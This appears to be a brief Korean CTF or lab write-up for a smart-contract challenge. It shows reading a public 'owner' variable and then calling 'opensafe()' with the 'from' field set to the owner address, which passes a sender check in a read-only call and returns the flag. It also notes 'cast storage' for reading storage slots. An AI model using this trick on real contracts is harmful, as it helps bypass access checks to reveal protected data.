address public owner;
소스코드 보면 owner가 public으로 선언되어 있다. 이러면 주소를 참조하여 require문을 owner 주소로 요청할 수 있다. 

window.contract.methods.owner().call().then(result => console.log(Current owner: ${result}))
여기서 result 값을 아래 from의 값으로 넣어준다.

window.contract.methods.opensafe().call({ from: '${result}' })
    .then(flag => {
        console.log('${flag}');
        document.getElementById('result').innerText = flag;
    })

이게 콘솔에서 실행한 거고 스토리지에서 cast로 보려면 아래와 같이 입력한다.

cast storage <contract_address> <변수가 위치한 슬롯 번호> --rpc-url $RPC_URL
